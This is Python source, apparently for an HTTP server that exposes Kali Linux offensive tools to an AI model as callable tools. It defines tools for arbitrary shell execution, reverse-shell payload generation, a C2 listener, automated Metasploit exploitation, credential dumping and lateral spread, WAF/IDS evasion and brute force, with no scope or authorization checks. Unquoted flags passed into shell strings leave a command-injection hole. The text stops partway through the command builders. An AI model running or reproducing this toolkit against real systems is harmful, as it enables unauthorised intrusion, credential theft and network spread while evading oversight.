#!/usr/bin/env python3
"""
MCP Kali Linux Server
Exposes Kali penetration testing tools via HTTP API for the manucas app.

Usage:
  python3 kali-mcp-server.py [port]   (default port: 3000)

On Kali, run this and point the app to http://<kali-ip>:3000
"""
import json
import subprocess
import shlex
import sys
import urllib.request
import urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

# ── Tool definitions (Claude tool_use format) ─────────────────────────────────
TOOLS = {
    "nmap": {
        "description": "Network port scanner. Discover open ports, services and OS on targets.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "IP address, hostname or CIDR range (e.g. 10.0.0.1 or 10.0.0.0/24)"},
                "flags":  {"type": "string", "description": "nmap flags (default: -sV -sC). Example: -sV -O -p 80,443,8080"}
            },
            "required": ["target"]
        }
    },
    "gobuster": {
        "description": "Directory and file brute-force web scanner.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target":   {"type": "string", "description": "Target URL (e.g. http://10.0.0.1)"},
                "wordlist": {"type": "string", "description": "Wordlist path (default: /usr/share/wordlists/dirb/common.txt)"},
                "flags":    {"type": "string", "description": "Additional gobuster flags (e.g. -x php,html -t 50)"}
            },
            "required": ["target"]
        }
    },
    "nikto": {
        "description": "Web server vulnerability and misconfiguration scanner.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target URL or IP (e.g. http://10.0.0.1)"},
                "flags":  {"type": "string", "description": "Additional nikto flags"}
            },
            "required": ["target"]
        }
    },
    "whatweb": {
        "description": "Web technology fingerprinting (CMS, frameworks, server, etc).",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "flags":  {"type": "string", "description": "Additional whatweb flags (default: -a 3 for aggressive)"}
            },
            "required": ["target"]
        }
    },
    "dig": {
        "description": "DNS lookup and zone transfer utility.",
        "input_schema": {
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Domain name to query"},
                "type":   {"type": "string", "description": "Record type: A, AAAA, MX, NS, TXT, AXFR, ANY (default: A)"},
                "flags":  {"type": "string", "description": "Additional dig flags"}
            },
            "required": ["domain"]
        }
    },
    "whois": {
        "description": "WHOIS domain/IP registration information lookup.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Domain name or IP address"}
            },
            "required": ["target"]
        }
    },
    "curl": {
        "description": "HTTP/HTTPS request tool. Fetch web pages, headers, APIs.",
        "input_schema": {
            "type": "object",
            "properties": {
                "url":   {"type": "string", "description": "Target URL"},
                "flags": {"type": "string", "description": "curl flags (e.g. -I for headers, -X POST -d 'data', -H 'Header: val')"}
            },
            "required": ["url"]
        }
    },
    "sqlmap": {
        "description": "Automatic SQL injection detection and database extraction.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target URL with parameter (e.g. http://site.com/page?id=1)"},
                "flags":  {"type": "string", "description": "sqlmap flags (default: --batch --level=1). Example: --dbs --batch --risk=2"}
            },
            "required": ["target"]
        }
    },
    "ffuf": {
        "description": "Fast web fuzzer for directories, parameters and vhosts.",
        "input_schema": {
            "type": "object",
            "properties": {
                "url":      {"type": "string", "description": "URL with FUZZ placeholder (e.g. http://site.com/FUZZ)"},
                "wordlist": {"type": "string", "description": "Wordlist path (default: /usr/share/wordlists/dirb/common.txt)"},
                "flags":    {"type": "string", "description": "Additional ffuf flags (e.g. -fc 404 -t 50)"}
            },
            "required": ["url"]
        }
    },
    "hydra": {
        "description": "Network login brute-force tool for SSH, FTP, HTTP, etc.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target":    {"type": "string", "description": "Target IP or hostname"},
                "service":   {"type": "string", "description": "Service to attack (ssh, ftp, http-post-form, smb, etc)"},
                "userlist":  {"type": "string", "description": "Username or path to username list"},
                "passlist":  {"type": "string", "description": "Password or path to password list (default: /usr/share/wordlists/rockyou.txt.gz)"},
                "flags":     {"type": "string", "description": "Additional hydra flags (e.g. -t 4 -V)"}
            },
            "required": ["target", "service", "userlist"]
        }
    },
    "netcat": {
        "description": "Network utility for port checking and banner grabbing.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target IP or hostname"},
                "port":   {"type": "string", "description": "Port number"},
                "flags":  {"type": "string", "description": "Additional nc flags (default: -zv for port scan)"}
            },
            "required": ["target", "port"]
        }
    },
    "shell": {
        "description": "Execute any shell command directly on Kali Linux. Use for tools not listed above.",
        "input_schema": {
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "Full shell command to run (e.g. 'cat /etc/hosts', 'msfvenom -p ...')"},
                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 30, max: 300)"}
            },
            "required": ["command"]
        }
    },
    "cve_search": {
        "description": "Search the NVD (National Vulnerability Database) for CVEs. Access to 260,000+ CVEs by keyword, product, vendor or severity.",
        "input_schema": {
            "type": "object",
            "properties": {
                "keyword":  {"type": "string", "description": "Search term (e.g. 'apache', 'log4j', 'openssh 8.2', 'windows rdp')"},
                "severity": {"type": "string", "description": "Filter by severity: LOW, MEDIUM, HIGH, CRITICAL"},
                "limit":    {"type": "integer", "description": "Number of results to return (default: 20, max: 50)"}
            },
            "required": ["keyword"]
        }
    },
    "cve_lookup": {
        "description": "Look up detailed information about a specific CVE by its ID from the NVD database.",
        "input_schema": {
            "type": "object",
            "properties": {
                "cve_id": {"type": "string", "description": "CVE identifier (e.g. CVE-2021-44228, CVE-2023-23397)"}
            },
            "required": ["cve_id"]
        }
    },
    "searchsploit": {
        "description": "Search Exploit-DB for public exploits and proof-of-concept code for vulnerabilities.",
        "input_schema": {
            "type": "object",
            "properties": {
                "query": {"type": "string", "description": "Search term (e.g. 'apache 2.4', 'vsftpd 2.3.4', 'ms17-010')"},
                "flags": {"type": "string", "description": "Additional searchsploit flags (e.g. --www for URL, --id for EDB-ID only)"}
            },
            "required": ["query"]
        }
    },
    "metasploit": {
        "description": "Run Metasploit Framework commands. Search modules, run exploits, auxiliary scanners.",
        "input_schema": {
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "msfconsole command (e.g. 'search ms17-010', 'use exploit/windows/smb/ms17_010_eternalblue', 'search cve:2021-44228')"},
                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 60)"}
            },
            "required": ["command"]
        }
    },
    "msfvenom": {
        "description": "Generate payloads with msfvenom (reverse shells, encoders, formats).",
        "input_schema": {
            "type": "object",
            "properties": {
                "payload": {"type": "string", "description": "Payload (e.g. windows/x64/meterpreter/reverse_tcp, linux/x86/shell_reverse_tcp)"},
                "lhost":   {"type": "string", "description": "Listener IP"},
                "lport":   {"type": "string", "description": "Listener port"},
                "format":  {"type": "string", "description": "Output format: exe, elf, php, py, ps1, raw (default: exe)"},
                "output":  {"type": "string", "description": "Output file path (e.g. /tmp/shell.exe)"},
                "flags":   {"type": "string", "description": "Additional msfvenom flags (e.g. -e x86/shikata_ga_nai -i 3)"}
            },
            "required": ["payload", "lhost", "lport"]
        }
    },
    "john": {
        "description": "John the Ripper password hash cracker.",
        "input_schema": {
            "type": "object",
            "properties": {
                "hashfile": {"type": "string", "description": "Path to file containing hashes"},
                "wordlist": {"type": "string", "description": "Wordlist path (default: /usr/share/wordlists/rockyou.txt)"},
                "format":   {"type": "string", "description": "Hash format (e.g. md5, sha256, ntlm, bcrypt). Leave empty for auto-detect."},
                "flags":    {"type": "string", "description": "Additional john flags"}
            },
            "required": ["hashfile"]
        }
    },
    "hashcat": {
        "description": "GPU-accelerated password hash cracker.",
        "input_schema": {
            "type": "object",
            "properties": {
                "hashfile": {"type": "string", "description": "Path to hash file"},
                "mode":     {"type": "string", "description": "Hash mode (e.g. 0=MD5, 100=SHA1, 1000=NTLM, 1800=SHA512crypt, 13100=Kerberoast)"},
                "wordlist": {"type": "string", "description": "Wordlist path (default: /usr/share/wordlists/rockyou.txt)"},
                "flags":    {"type": "string", "description": "Additional hashcat flags (e.g. -r /usr/share/hashcat/rules/best64.rule)"}
            },
            "required": ["hashfile", "mode"]
        }
    },
    "wpscan": {
        "description": "WordPress vulnerability scanner. Enumerate users, plugins, themes and CVEs.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target":  {"type": "string", "description": "Target WordPress URL"},
                "flags":   {"type": "string", "description": "Additional wpscan flags (e.g. --enumerate u,p,t --plugins-detection aggressive)"},
                "api_token": {"type": "string", "description": "WPScan API token for CVE lookup (optional)"}
            },
            "required": ["target"]
        }
    },
    "enum4linux": {
        "description": "Enumerate Windows/Samba shares, users, groups, policies via SMB/RPC.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target IP or hostname"},
                "flags":  {"type": "string", "description": "Flags: -a (all), -U (users), -S (shares), -G (groups), -P (password policy). Default: -a"}
            },
            "required": ["target"]
        }
    },
    "crackmapexec": {
        "description": "Swiss army knife for Windows/AD networks. SMB, LDAP, WinRM enumeration and credential testing.",
        "input_schema": {
            "type": "object",
            "properties": {
                "protocol": {"type": "string", "description": "Protocol: smb, ldap, winrm, ssh, mssql (default: smb)"},
                "target":   {"type": "string", "description": "Target IP, range or file"},
                "flags":    {"type": "string", "description": "Flags (e.g. -u admin -p password --shares, --users, -x 'whoami')"}
            },
            "required": ["target"]
        }
    },
    "theharvester": {
        "description": "OSINT tool for emails, subdomains, IPs, URLs from public sources.",
        "input_schema": {
            "type": "object",
            "properties": {
                "domain":  {"type": "string", "description": "Target domain (e.g. example.com)"},
                "sources": {"type": "string", "description": "Sources: google, bing, linkedin, shodan, all (default: google,bing)"},
                "limit":   {"type": "integer", "description": "Result limit (default: 100)"}
            },
            "required": ["domain"]
        }
    },
    "amass": {
        "description": "Advanced subdomain enumeration and DNS reconnaissance.",
        "input_schema": {
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Target domain"},
                "mode":   {"type": "string", "description": "Mode: enum (passive+active), intel, viz (default: enum -passive)"},
                "flags":  {"type": "string", "description": "Additional amass flags (e.g. -brute -w /usr/share/wordlists/amass/subdomains.lst)"}
            },
            "required": ["domain"]
        }
    },
    "subfinder": {
        "description": "Fast passive subdomain discovery tool.",
        "input_schema": {
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Target domain"},
                "flags":  {"type": "string", "description": "Additional subfinder flags (e.g. -silent, -o output.txt)"}
            },
            "required": ["domain"]
        }
    },
    "responder": {
        "description": "LLMNR/NBT-NS/MDNS poisoner for credential capture on local networks.",
        "input_schema": {
            "type": "object",
            "properties": {
                "interface": {"type": "string", "description": "Network interface (e.g. eth0, wlan0)"},
                "flags":     {"type": "string", "description": "Additional responder flags (e.g. -w for WPAD, -F for ForceWpadAuth)"},
                "timeout":   {"type": "integer", "description": "Capture duration in seconds (default: 30)"}
            },
            "required": ["interface"]
        }
    },
    "tcpdump": {
        "description": "Network packet capture and analysis.",
        "input_schema": {
            "type": "object",
            "properties": {
                "interface": {"type": "string", "description": "Interface to capture on (e.g. eth0, any)"},
                "filter":    {"type": "string", "description": "BPF filter (e.g. 'port 80', 'host 10.0.0.1', 'tcp')"},
                "count":     {"type": "integer", "description": "Number of packets to capture (default: 50)"},
                "flags":     {"type": "string", "description": "Additional tcpdump flags (e.g. -A for ASCII, -w file.pcap)"}
            },
            "required": ["interface"]
        }
    },
    "smbclient": {
        "description": "Connect to SMB/CIFS shares, list and download files.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target":   {"type": "string", "description": "Target (e.g. //10.0.0.1/share or //10.0.0.1/C$)"},
                "user":     {"type": "string", "description": "Username (default: anonymous)"},
                "password": {"type": "string", "description": "Password (default: empty)"},
                "flags":    {"type": "string", "description": "Additional flags (e.g. -L for list shares, -N for no password)"}
            },
            "required": ["target"]
        }
    },
    "snmpwalk": {
        "description": "SNMP enumeration - extract device info, users, running processes via SNMP.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target":    {"type": "string", "description": "Target IP"},
                "community": {"type": "string", "description": "SNMP community string (default: public)"},
                "version":   {"type": "string", "description": "SNMP version: 1, 2c, 3 (default: 2c)"},
                "oid":       {"type": "string", "description": "OID to walk (default: . for all)"}
            },
            "required": ["target"]
        }
    },
    "wfuzz": {
        "description": "Web application fuzzer for parameters, auth bypass, and injection testing.",
        "input_schema": {
            "type": "object",
            "properties": {
                "url":      {"type": "string", "description": "URL with FUZZ placeholder (e.g. http://site.com/page?id=FUZZ)"},
                "wordlist": {"type": "string", "description": "Wordlist path (default: /usr/share/wordlists/dirb/common.txt)"},
                "flags":    {"type": "string", "description": "Additional wfuzz flags (e.g. --hc 404 -H 'Cookie: sess=abc')"}
            },
            "required": ["url"]
        }
    },
    "nuclei": {
        "description": "Fast vulnerability scanner with 10,000+ CVE templates. Equivalent to Burp Suite Scanner but CLI-driven. Detects XSS, SQLi, RCE, misconfigs, exposed panels, CVEs and more.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target":    {"type": "string", "description": "Target URL or IP (e.g. http://10.0.0.1 or 10.0.0.0/24)"},
                "templates": {"type": "string", "description": "Template tags or paths: cves, xss, sqli, rce, lfi, ssrf, misconfig, exposure, takeover, default-logins (default: cves,misconfig,exposure)"},
                "severity":  {"type": "string", "description": "Filter by severity: critical, high, medium, low, info (default: critical,high,medium)"},
                "flags":     {"type": "string", "description": "Additional nuclei flags (e.g. -H 'Cookie: sess=abc' -rl 50 -timeout 5)"}
            },
            "required": ["target"]
        }
    },
    "payload_mutate": {
        "description": "Generate 30+ WAF/filter bypass payload variants. Given a blocked payload (XSS, SQLi, RCE, LFI), generates encoded, obfuscated, case-mixed, comment-injected, unicode, hex and double-encoded variants. Tests each variant against the target.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target":  {"type": "string", "description": "Target URL with parameter to test (e.g. http://site.com/page?id=1)"},
                "payload": {"type": "string", "description": "Blocked payload to mutate (e.g. ' OR 1=1--, <script>alert(1)</script>, ../etc/passwd)"},
                "type":    {"type": "string", "description": "Payload type: sqli, xss, lfi, rce, generic (default: generic)"}
            },
            "required": ["target", "payload"]
        }
    },
    "crawl_auth": {
        "description": "Authenticated web crawler. Login with credentials, then crawl all protected pages discovering hidden endpoints, API calls, admin panels, and IDOR opportunities.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target":   {"type": "string", "description": "Base URL (e.g. http://site.com)"},
                "username": {"type": "string", "description": "Login username"},
                "password": {"type": "string", "description": "Login password"},
                "login_url":{"type": "string", "description": "Login form URL (default: target/login)"},
                "depth":    {"type": "integer", "description": "Crawl depth (default: 3)"}
            },
            "required": ["target", "username", "password"]
        }
    },
    "idor_test": {
        "description": "Test for IDOR (Insecure Direct Object Reference) and Broken Object Level Authorization. Enumerates IDs in URLs/params and checks if unauthorized access is possible.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target":   {"type": "string", "description": "Target URL with numeric ID param (e.g. http://site.com/api/user/1 or http://site.com/profile?id=100)"},
                "range":    {"type": "string", "description": "ID range to test (default: 1-50)"},
                "cookie":   {"type": "string", "description": "Session cookie for authenticated testing (e.g. session=abc123)"},
                "method":   {"type": "string", "description": "HTTP method: GET or POST (default: GET)"}
            },
            "required": ["target"]
        }
    },
    "second_order": {
        "description": "Test for second-order injection (stored XSS, stored SQLi, stored RCE). Injects payloads into registration, profile, comment and search fields, then visits pages that render stored data to trigger deferred execution.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target":      {"type": "string", "description": "Target base URL"},
                "inject_path": {"type": "string", "description": "Path where payload is stored (e.g. /register, /profile/update, /comment)"},
                "trigger_path":{"type": "string", "description": "Path that renders the stored payload (e.g. /dashboard, /profile/view, /admin/users)"},
                "field":       {"type": "string", "description": "Form field to inject (e.g. username, bio, comment, search)"},
                "cookie":      {"type": "string", "description": "Session cookie if auth required"}
            },
            "required": ["target", "inject_path", "trigger_path"]
        }
    },
    "bizlogic_fuzz": {
        "description": "Fuzz business logic vulnerabilities: negative prices, zero/overflow quantities, discount stacking, coupon reuse, race conditions on purchases, negative balance transfers, free item tricks.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target":    {"type": "string", "description": "Target URL (checkout, cart, transfer endpoint, etc.)"},
                "endpoint":  {"type": "string", "description": "Specific endpoint to fuzz (e.g. /cart/add, /checkout, /transfer, /apply-coupon)"},
                "cookie":    {"type": "string", "description": "Session cookie"},
                "mode":      {"type": "string", "description": "Mode: price (negative prices), qty (overflow qty), coupon (reuse), race (parallel requests), all (default: all)"}
            },
            "required": ["target"]
        }
    },
    "evasion_scan": {
        "description": "Full evasion scan: randomized timing, decoy IPs, packet fragmentation, rotated User-Agents, proxychains, slow scan to evade IDS/IPS/WAF detection.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target IP or URL"},
                "mode":   {"type": "string", "description": "Mode: stealth (nmap -sS -T1 decoys), slow (rate-limited nuclei), full (both). Default: full"},
                "proxy":  {"type": "string", "description": "Proxy chain (e.g. socks5://127.0.0.1:9050 for Tor)"}
            },
            "required": ["target"]
        }
    },
    "c2_handler": {
        "description": "Start Metasploit multi/handler C2 listener to catch reverse shells. Configures payload, LHOST, LPORT and starts background listener.",
        "input_schema": {
            "type": "object",
            "properties": {
                "payload": {"type": "string", "description": "MSF payload (e.g. windows/x64/meterpreter/reverse_tcp, linux/x86/shell_reverse_tcp). Default: linux/x86/shell/reverse_tcp"},
                "lhost":   {"type": "string", "description": "Attacker IP (default: auto-detect)"},
                "lport":   {"type": "string", "description": "Listener port (default: 4444)"}
            },
            "required": []
        }
    },
    "lateral_move": {
        "description": "Post-exploitation lateral movement. After gaining initial access, enumerate internal network, dump credentials, test for reuse on other hosts, pivot via SSH/SMB.",
        "input_schema": {
            "type": "object",
            "properties": {
                "pivot_host": {"type": "string", "description": "Compromised host IP"},
                "network":    {"type": "string", "description": "Internal network CIDR to enumerate (e.g. 192.168.1.0/24)"},
                "creds":      {"type": "string", "description": "Compromised credentials (user:pass)"},
                "mode":       {"type": "string", "description": "Mode: enum (discover hosts), dump (dump creds), spread (try creds on all hosts), full (default: full)"}
            },
            "required": ["pivot_host"]
        }
    },
    "playwright_crawl": {
        "description": "Real headless browser crawler using Playwright. Renders JavaScript, clicks buttons, fills forms, authenticates with real credentials, and discovers hidden endpoints in SPAs/React/Angular apps that curl-based crawlers miss.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target":    {"type": "string", "description": "Base URL (e.g. http://site.com)"},
                "username":  {"type": "string", "description": "Login username"},
                "password":  {"type": "string", "description": "Login password"},
                "login_url": {"type": "string", "description": "Login page URL (default: target/login)"},
                "depth":     {"type": "integer", "description": "Click depth per page (default: 2)"},
                "actions":   {"type": "string", "description": "Extra actions: screenshot, forms, api_calls, all (default: all)"}
            },
            "required": ["target"]
        }
    },
    "adaptive_mutate": {
        "description": "Intelligent payload mutation with real-time response analysis. Sends payload, reads WAF fingerprint from response headers/body, then generates targeted bypass variants. Adapts: if blocked → tries charencode+equaltolike; if error → tries time-based blind; if WAF detected → applies WAF-specific tamper chain.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target":  {"type": "string", "description": "Target URL with injection point (e.g. http://site.com/page?id=INJECT)"},
                "payload": {"type": "string", "description": "Base payload to adapt (e.g. ' OR 1=1--)"},
                "type":    {"type": "string", "description": "Payload class: sqli, xss, lfi, rce (default: sqli)"},
                "rounds":  {"type": "integer", "description": "Mutation rounds (default: 5)"}
            },
            "required": ["target", "payload"]
        }
    },
    "cve_rag": {
        "description": "CVE RAG (Retrieval-Augmented Generation) lookup. Given detected product + version, finds exact CVEs, CVSS scores, PoC links, and matching Metasploit modules. Smarter than generic search: queries NVD by CPE, filters by exploitability, and maps to msf module names automatically.",
        "input_schema": {
            "type": "object",
            "properties": {
                "product": {"type": "string", "description": "Product/service name (e.g. apache, wordpress, openssl, log4j, php, nginx)"},
                "version": {"type": "string", "description": "Detected version (e.g. 2.4.49, 5.8.1, 1.0.2)"},
                "severity":{"type": "string", "description": "Min severity: critical, high, medium (default: high)"},
                "limit":   {"type": "integer", "description": "Max results (default: 10)"}
            },
            "required": ["product", "version"]
        }
    },
    "session_manage": {
        "description": "Persistent session management. Create and reuse cookie jars, extract CSRF tokens, store JWT tokens, replay authenticated requests, and manage multi-step auth flows across tool calls.",
        "input_schema": {
            "type": "object",
            "properties": {
                "action":   {"type": "string", "description": "Action: login (post creds+save cookie), get (fetch with saved cookie), csrf (extract token), jwt_decode (decode+check), replay (resend last request). Default: login"},
                "target":   {"type": "string", "description": "URL to login or request"},
                "username": {"type": "string", "description": "Username for login"},
                "password": {"type": "string", "description": "Password for login"},
                "cookie":   {"type": "string", "description": "Cookie string to use (if already have one)"},
                "session_id":{"type": "string", "description": "Session file ID to reuse (default: kgb_session)"},
                "data":     {"type": "string", "description": "POST data for login or replay (e.g. user=admin&pass=1234)"}
            },
            "required": ["target", "action"]
        }
    },
    "mitmproxy_scan": {
        "description": "Intercept, analyze and replay HTTP traffic using mitmproxy. Start a transparent proxy, drive a target through it, capture all requests/responses, then replay with mutations (header injection, param fuzzing, body manipulation).",
        "input_schema": {
            "type": "object",
            "properties": {
                "target":  {"type": "string", "description": "Target URL to proxy requests through"},
                "port":    {"type": "integer", "description": "mitmproxy listen port (default: 8080)"},
                "mode":    {"type": "string", "description": "Mode: intercept (capture traffic), replay (replay saved flows), fuzz (mutate+replay), analyze (parse saved flows for secrets). Default: intercept"},
                "duration":{"type": "integer", "description": "Capture duration in seconds (default: 30)"},
                "flows_file":{"type": "string", "description": "Path to saved mitmproxy flows file (for replay/analyze mode)"}
            },
            "required": ["target"]
        }
    },
    "waf_bypass": {
        "description": "Detect WAF and apply automatic bypass techniques. Uses wafw00f to identify WAF, then runs sqlmap/ffuf/nuclei with tamper scripts, random agents, and evasion flags to bypass protection.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target URL (e.g. http://site.com/page?id=1)"},
                "mode":   {"type": "string", "description": "Bypass mode: detect (just detect WAF), sqli (bypass+SQLi), fuzz (bypass+dir fuzz), full (all). Default: full"}
            },
            "required": ["target"]
        }
    },
    "msf_exploit": {
        "description": "Automated CVE exploitation using Metasploit Framework. Given a CVE or service, searches for exploit modules, configures RHOST/LHOST and runs the exploit.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target IP or hostname"},
                "cve":    {"type": "string", "description": "CVE ID (e.g. CVE-2021-44228) or search term (e.g. ms17-010, eternalblue)"},
                "lhost":  {"type": "string", "description": "Attacker IP for reverse shell (default: auto-detect via 'hostname -I')"},
                "lport":  {"type": "string", "description": "Listener port (default: 4444)"},
                "flags":  {"type": "string", "description": "Extra msfconsole options"}
            },
            "required": ["target", "cve"]
        }
    },
    "ghauri": {
        "description": "Advanced SQL injection detection and exploitation tool. Modern alternative to sqlmap with better bypass techniques for WAFs.",
        "input_schema": {
            "type": "object",
            "properties": {
                "url":   {"type": "string", "description": "Target URL with parameter (e.g. http://site.com/page?id=1)"},
                "flags": {"type": "string", "description": "Additional ghauri flags (e.g. --dbs --dump -D dbname -T table --batch)"}
            },
            "required": ["url"]
        }
    },
    "httpx": {
        "description": "Fast HTTP toolkit for probing web servers. Detects status codes, titles, tech stack, CDN, CNAME, IPs, and more across many hosts at once.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Single URL, IP, domain or file path with list of targets (e.g. http://10.0.0.1 or targets.txt)"},
                "flags":  {"type": "string", "description": "Additional httpx flags (e.g. -title -tech-detect -status-code -cdn -ip -cname -silent)"}
            },
            "required": ["target"]
        }
    },
    "aquatone": {
        "description": "Domain flyover tool that takes screenshots of web pages across many hosts. Useful for visual recon of large attack surfaces.",
        "input_schema": {
            "type": "object",
            "properties": {
                "hosts":   {"type": "string", "description": "Newline-separated list of hosts/URLs or path to file with hosts"},
                "out":     {"type": "string", "description": "Output directory (default: /tmp/aquatone_out)"},
                "flags":   {"type": "string", "description": "Additional aquatone flags (e.g. -ports 80,443,8080 -timeout 3000)"}
            },
            "required": ["hosts"]
        }
    }
}

# ── Command builders ───────────────────────────────────────────────────────────

def build_command(tool, args):
    if tool == "nmap":
        flags = args.get("flags", "-sV -sC")
        return f"nmap {flags} {shlex.quote(str(args['target']))}"

    elif tool == "gobuster":
        wl    = args.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        flags = args.get("flags", "")
        return f"gobuster dir -u {shlex.quote(args['target'])} -w {wl} {flags} --no-error 2>&1 | head -80"

    elif tool == "nikto":
        flags = args.get("flags", "")
        return f"nikto -h {shlex.quote(args['target'])} {flags} 2>&1 | head -60"

    elif tool == "whatweb":
        flags = args.get("flags", "-a 3")
        return f"whatweb {flags} {shlex.quote(args['target'])} 2>&1"

    elif tool == "dig":
        rtype = args.get("type", "A")
        flags = args.get("flags", "")
        return f"dig {shlex.quote(args['domain'])} {rtype} {flags}"

    elif tool == "whois":
        return f"whois {shlex.quote(str(args['target']))} 2>&1 | head -60"

    elif tool == "curl":
        flags = args.get("flags", "-sL --max-time 15")
        return f"curl {flags} {shlex.quote(args['url'])} 2>&1 | head -100"

    elif tool == "sqlmap":
        flags = args.get("flags", "--batch --level=1")
        return f"sqlmap -u {shlex.quote(args['target'])} {flags} 2>&1 | tail -50"

    elif tool == "ffuf":
        wl    = args.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        flags = args.get("flags", "-fc 404")
        return f"ffuf -u {shlex.quote(args['url'])} -w {wl} {flags} 2>&1 | head -80"

    elif tool == "hydra":
        service  = args.get("service", "ssh")
        user     = args.get("userlist", "admin")
        passlist = args.get("passlist", "/usr/share/wordlists/rockyou.txt.gz")
        flags    = args.get("flags", "-t 4 -V")
        target   = shlex.quote(str(args['target']))
        ul_flag  = f"-l {shlex.quote(user)}" if not user.startswith("/") else f"-L {shlex.quote(user)}"
        pl_flag  = f"-p {shlex.quote(passlist)}" if not passlist.startswith("/") else f"-P {shlex.quote(passlist)}"
        return f"hydra {ul_flag} {pl_flag} {flags} {target} {service} 2>&1 | head -60"

    elif tool == "netcat":
        flags = args.get("flags", "-zv")
        return f"nc {flags} -w 3 {shlex.quote(str(args['target']))} {shlex.quote(str(args['port']))} 2>&1"

    elif tool == "shell":
        return args["command"]

    elif tool == "searchsploit":
        flags = args.get("flags", "")
        return f"searchsploit {flags} {shlex.quote(args['query'])} 2>&1 | head -60"

    elif tool == "metasploit":
        cmd = args["command"]
        timeout = args.get("timeout", 60)
        return f"msfconsole -q -x {shlex.quote(cmd + '; exit')} 2>&1 | head -80"

    elif tool == "msfvenom":
        payload = args["payload"]
        lhost   = args["lhost"]
        lport   = args["lport"]
        fmt     = args.get("format", "exe")
        out     = args.get("output", f"/tmp/payload.{fmt}")
        flags   = args.get("flags", "")
        return f"msfvenom -p {shlex.quote(payload)} LHOST={shlex.quote(lhost)} LPORT={shlex.quote(str(lport))} -f {shlex.quote(fmt)} {flags} -o {shlex.quote(out)} 2>&1"

    elif tool == "john":
        wl     = args.get("wordlist", "/usr/share/wordlists/rockyou.txt")
        fmt    = f"--format={args['format']}" if args.get("format") else ""
        flags  = args.get("flags", "")
        hfile  = shlex.quote(args["hashfile"])
        return f"john {fmt} --wordlist={shlex.quote(wl)} {flags} {hfile} 2>&1 | head -40"

    elif tool == "hashcat":
        wl    = args.get("wordlist", "/usr/share/wordlists/rockyou.txt")
        flags = args.get("flags", "")
        return f"hashcat -m {shlex.quote(str(args['mode']))} {shlex.quote(args['hashfile'])} {shlex.quote(wl)} {flags} --potfile-disable 2>&1 | head -60"

    elif tool == "wpscan":
        token = f"--api-token {shlex.quote(args['api_token'])}" if args.get("api_token") else ""
        flags = args.get("flags", "--enumerate u,p,t")
        return f"wpscan --url {shlex.quote(args['target'])} {flags} {token} 2>&1 | head -100"

    elif tool == "enum4linux":
        flags = args.get("flags", "-a")
        return f"enum4linux {flags} {shlex.quote(args['target'])} 2>&1 | head -150"

    elif tool == "crackmapexec":
        proto = args.get("protocol", "smb")
        flags = args.get("flags", "")
        return f"crackmapexec {shlex.quote(proto)} {shlex.quote(args['target'])} {flags} 2>&1 | head -80"

    elif tool == "theharvester":
        sources = args.get("sources", "google,bing")
        limit   = args.get("limit", 100)
        return f"theHarvester -d {shlex.quote(args['domain'])} -b {shlex.quote(sources)} -l {limit} 2>&1 | head -100"

    elif tool == "amass":
        mode  = args.get("mode", "enum -passive")
        flags = args.get("flags", "")
        return f"amass {mode} -d {shlex.quote(args['domain'])} {flags} 2>&1 | head -100"

    elif tool == "subfinder":
        flags = args.get("flags", "")
        return f"subfinder -d {shlex.quote(args['domain'])} {flags} 2>&1 | head -100"

    elif tool == "responder":
        flags   = args.get("flags", "")
        timeout = args.get("timeout", 30)
        return f"timeout {timeout} responder -I {shlex.quote(args['interface'])} {flags} 2>&1 | head -80"

    elif tool == "tcpdump":
        count  = args.get("count", 50)
        filt   = shlex.quote(args["filter"]) if args.get("filter") else ""
        flags  = args.get("flags", "-nn")
        return f"tcpdump -i {shlex.quote(args['interface'])} {flags} -c {count} {filt} 2>&1"

    elif tool == "smbclient":
        user  = args.get("user", "anonymous")
        pw    = args.get("password", "")
        flags = args.get("flags", "-N")
        return f"smbclient {shlex.quote(args['target'])} -U {shlex.quote(user)}%{shlex.quote(pw)} {flags} -c 'ls' 2>&1 | head -60"

    elif tool == "snmpwalk":
        community = args.get("community", "public")
        version   = args.get("version", "2c")
        oid       = args.get("oid", ".")
        return f"snmpwalk -v{version} -c {shlex.quote(community)} {shlex.quote(args['target'])} {shlex.quote(oid)} 2>&1 | head -100"

    elif tool == "wfuzz":
        wl    = args.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        flags = args.get("flags", "--hc 404")
        return f"wfuzz -w {shlex.quote(wl)} {flags} {shlex.quote(args['url'])} 2>&1 | head -80"

    elif tool == "nuclei":
